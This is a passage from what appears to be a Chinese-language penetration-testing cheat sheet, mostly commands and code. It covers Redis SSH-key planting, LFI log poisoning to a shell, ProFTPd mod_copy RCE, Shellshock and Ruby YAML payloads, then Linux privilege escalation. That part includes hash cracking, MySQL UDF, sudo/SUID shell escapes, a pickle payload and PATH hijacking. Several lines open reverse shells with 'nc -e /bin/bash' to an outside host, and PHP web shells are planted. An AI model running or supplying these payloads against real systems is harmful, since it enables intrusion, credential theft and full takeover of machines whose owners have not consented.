?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>SSH秘钥</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat ~/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; new.txt</span><br><span class="line">redis-cli -h 192.168.0.0 flushall</span><br><span class="line">cat new.txt | redis-cli -h 1192.168.0.0 -x set crackit</span><br><span class="line">redis-cli -h 192.168.0.0 config set dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 192.168.0.0 config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">redis-cli -h 192.168.0.0 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@192.168.0.0</span><br></pre></td></tr></table></figure><h3 id="其他漏洞"><a class="markdownIt-Anchor" href="#其他漏洞"></a> 其他漏洞</h3><ul><li>git信息泄露 : githack</li><li>DS_Store文件泄露 : ds_store_exp</li><li>SMTP + LFI = GetShell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.0.0 25</span><br><span class="line">MAIl FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: Username</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br><span class="line">~~~~~</span><br><span class="line">&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8081</span><br></pre></td></tr></table></figure><ul><li>SSH + LFI = GetShell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.0</span><br><span class="line">file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls</span><br></pre></td></tr></table></figure><ul><li>ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.0 21</span><br><span class="line">site cpfr &#x2F;etc&#x2F;passwd</span><br><span class="line">site cpto &#x2F;home&#x2F;ftp</span><br><span class="line">~~~~~~</span><br><span class="line">nc 192.168.0.0 21</span><br><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><ul><li><p>ShellShock</p><ul><li><code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code> (CVE-2014-6271)</li><li><code>env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</code> (CVE-2014-7169)</li><li>/cgi-bin/* 200</li><li><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.0/cgi-bin/</code></li></ul></li><li><p>Ruby YAML.Load() Deserialization</p></li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Installer</span><br><span class="line">    <span class="symbol">i:</span> x</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::SpecFetcher</span><br><span class="line">    <span class="symbol">i:</span> y</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Requirement</span><br><span class="line">  <span class="symbol">requirements:</span></span><br><span class="line">    !ruby/<span class="symbol">object:</span>Gem::Package::TarReader</span><br><span class="line">    <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::BufferedIO</span><br><span class="line">      <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::Package::TarReader::Entry</span><br><span class="line">         <span class="symbol">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="symbol">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="symbol">debug_output:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">         <span class="symbol">socket:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::RequestSet</span><br><span class="line">             <span class="symbol">sets:</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">                 <span class="symbol">socket:</span> !ruby/<span class="class"><span class="keyword">module</span> &#x27;<span class="title">Kernel</span>&#x27;</span></span><br><span class="line">                 <span class="symbol">method_id:</span> <span class="symbol">:system</span></span><br><span class="line">             <span class="symbol">git_set:</span> <span class="string">&quot;touch /tmp/hacked&quot;</span></span><br><span class="line">         <span class="symbol">method_id:</span> <span class="symbol">:resolve</span></span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><h3 id="cap特权"><a class="markdownIt-Anchor" href="#cap特权"></a> cap特权</h3><p><code>getcap -r / 2&gt; /dev/null</code></p><table><thead><tr><th>Capabilities</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td style="text-align:left">将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td style="text-align:left">使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td style="text-align:left">修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td style="text-align:left">允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td style="text-align:left">允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td style="text-align:left">忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td style="text-align:left">允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td style="text-align:left">允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td style="text-align:left">允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td style="text-align:left">允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td style="text-align:left">允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td style="text-align:left">允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td style="text-align:left">允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td style="text-align:left">允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td style="text-align:left">允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td style="text-align:left">参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td style="text-align:left">允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td style="text-align:left">允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td style="text-align:left">允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td style="text-align:left">允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td style="text-align:left">允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td style="text-align:left">允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td style="text-align:left">允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td style="text-align:left">忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td style="text-align:left">允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td style="text-align:left">允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td style="text-align:left">允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td style="text-align:left">允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><p><strong>流量监听</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line">timeout 120 tcpdump -i interface -w cap.pcap</span><br><span class="line">tcpdump -r cap.pcap</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 120 tshark -i interface</span><br></pre></td></tr></table></figure><h3 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> Shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><ul><li>tty(输出至终端/需要注意tty的写入权限)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tty</span><br><span class="line">&#x2F;dev&#x2F;pts&#x2F;0</span><br><span class="line">cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0</span><br></pre></td></tr></table></figure><h3 id="密码"><a class="markdownIt-Anchor" href="#密码"></a> 密码</h3><ul><li>密码共用<ul><li>WEB账户</li><li>WEB admin</li><li>SSH</li><li>FTP</li><li>MySQL</li><li>root</li><li>Redis</li></ul></li><li><code>/etc/passwd</code> &amp; <code>/etc/shadow</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat --help | grep Unix</span><br><span class="line">hashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27; &gt; passwd</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br></pre></td></tr></table></figure><ul><li>unshadow</li><li>ssh</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br></pre></td></tr></table></figure><ul><li>wordpress – $P$ – phpass</li></ul><table><thead><tr><th style="text-align:center">passwd/shadow</th><th style="text-align:center">Method</th><th style="text-align:center">hashcat -m</th><th style="text-align:center">john --format=</th></tr></thead><tbody><tr><td style="text-align:center">$1</td><td style="text-align:center">md5</td><td style="text-align:center">500</td><td style="text-align:center">md5crypt-long</td></tr><tr><td style="text-align:center">$2*</td><td style="text-align:center">bcrypt(Blow Fish)</td><td style="text-align:center">3200</td><td style="text-align:center">bcrypt</td></tr><tr><td style="text-align:center">$5</td><td style="text-align:center">sha256</td><td style="text-align:center">7400</td><td style="text-align:center">sha256crypt</td></tr><tr><td style="text-align:center">$6</td><td style="text-align:center">sha512</td><td style="text-align:center">1800</td><td style="text-align:center">sha512crypt</td></tr></tbody></table><h3 id="本地服务探测"><a class="markdownIt-Anchor" href="#本地服务探测"></a> 本地服务探测</h3><ul><li>netstat</li><li>ss</li></ul><h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3><ul><li>插件路径: <code>show variables like 'plugin_dir';</code></li><li>文件权限: <code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><ul><li>mysqld.conf: “secure_file_priv=”</li><li>该值为空则无限制</li><li>该值为NULL则不可写入</li><li>该值为路径则可写入该路径（不包含子路径）</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><h4 id="udf文件dllso"><a class="markdownIt-Anchor" href="#udf文件dllso"></a> UDF文件(dll/so)</h4><p><strong>Metasploit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure><p>可以使用IDA来查看具体有哪些函数</p><ul><li>sys_get</li><li>sys_exec</li><li>sys_eval</li><li>sys_set</li><li>sys_bineval</li></ul><p><strong>SQLMap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><strong>Decode</strong><br /><code>python .\cloak.py -d -i ..\..\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p><h4 id="mysql执行系统命令"><a class="markdownIt-Anchor" href="#mysql执行系统命令"></a> Mysql执行系统命令</h4><ul><li>system whoami<br />(version &gt;= 5.7)</li></ul><h3 id="sudo-suid"><a class="markdownIt-Anchor" href="#sudo-suid"></a> SUDO &amp; SUID</h3><p><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong></p><p>使用Shell脚本进行提权，参数带有空格时需要用引号</p><p>SUID: <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo -i</span><br><span class="line">cat &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><p>查看可以以sudo模式运行的程序<br /><code>sudo -l</code></p><ul><li><p>当sudo权限的命令受到执行路径的限制时，可以使用<code>../</code>来进行bypass</p></li><li><p>python: <code>python -c 'import os;os.system(&quot;/bin/bash&quot;)'</code></p><ul><li>input(): <code>__import__('os').system('/bin/sh')</code></li><li>lib文件写入命令</li><li>pickle unserialize</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class RCE(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;)</span><br><span class="line">        return os.system, (cmd,)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))</span><br><span class="line"></span><br><span class="line">print(urllib.quote((pickle.dumps(payload()))))</span><br></pre></td></tr></table></figure><ul><li>php: <code>php -r &quot;system('/bin/bash');&quot;</code></li><li>rpm: <code>rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;'</code></li><li>dpkg</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gem install fpm</span><br><span class="line">mkdir exp &amp;&amp; cd exp</span><br><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n&#x2F;bin&#x2F;bash&#39; &gt; exp.sh</span><br><span class="line">fpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;</span><br><span class="line">dpkg -i exp_1.0_amd64.deb</span><br></pre></td></tr></table></figure><ul><li>ruby: <code>ruby -e 'exec &quot;/bin/bash&quot;'</code></li><li>gcc: <code>gcc -wrapper /bin/bash,-s .</code></li><li>perl: <code>perl -e 'exec &quot;/bin/bash&quot;;'</code></li><li>java:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sudo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">processBuilder.command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami &gt; whoami&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line">            BufferedReader reader =</span><br><span class="line">                    <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> exitCode = process.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;\nExited with error code : &quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">java sudo</span><br></pre></td></tr></table></figure><ul><li>mysql: <code>mysql -e '\! /bin/bash'</code></li><li>nmap<ul><li>2.02 &lt;= nmap -v &lt;=5.21</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><ul><li><p>vim</p><ul><li><p>浏览<code>/etc/shadow</code></p></li><li><p>shell</p></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ul><li><p>less</p></li><li><p>more</p></li><li><p>nano</p></li><li><p>cp</p><ul><li><p>覆盖passwd（垂直）</p></li><li><p>写入authorized_keys（水平）</p></li><li><p>–no-preserve=mode</p></li></ul></li><li><p>mv</p></li><li><p>wget</p></li><li><p>find</p><ul><li><p><code>find . -exec whoami \;</code></p></li><li><p><code>find . -exec /bin/bash -p\;</code></p></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li><p>bash</p></li><li><p>bash -p</p></li><li><p>awk</p><ul><li><p><code>awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p></li><li><p><code>/tmp/1</code> 是写好的账户信息</p></li></ul></li><li><p>RE用于匹配passwd中某单独一行的结尾部分</p></li><li><p>tee: <code>echo 1 | tee /etc/passwd</code></p></li><li><p>unzip</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">echo data &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">unzip new.zip -d &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h4 id="path"><a class="markdownIt-Anchor" href="#path"></a> $PATH</h4><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p><strong>echo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>copy</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>symlink</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">ln -s &#x2F;bin&#x2F;bash ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h3 id="mail"><a class="markdownIt-Anchor" href="#mail"></a> mail</h3><p><code>cat /var/spool/mail/*</code></p><h3 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h3><p><code>cat /etc/crontab</code><br /><code>ls -la /var/spool/cron/</code><br /><code>ls -la /tmp</code><br /><code>crontab -e</code></p><p>crontab所执行的命令一般来说是难以通过ps命令来发现的，除非是在命令执行的过程中正好使用ps命令查看进程<br />这对于耗时长的命令或者是使用脚本循环执行命令来说是可行的，但是对于几乎瞬时完成的命令则是束手无策<br />可以使用pspy来持续地监视后台进程<br /><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><ul><li>一般的crontab设置为整分运行，pspy每分钟的第一秒显示的命令即为crontab的内容</li><li>目录权限<ul><li>r 列出目录中的内容</li><li>w 在目录中增加删除文件，修改文件名</li><li>x 进入目录以及对目录下的文件进行操作</li><li>r-- 可以在不进入目录的情况下列出目录下的文件，但不能查看文件详细信息</li><li>–x 可以在单独列出已知文件，并查看文件详细信息</li></ul></li></ul><h3 id="passwd可写"><a class="markdownIt-Anchor" href="#passwd可写"></a> passwd可写</h3><p><code>ls -l /etc/passwd</code></p><figure class="highlight 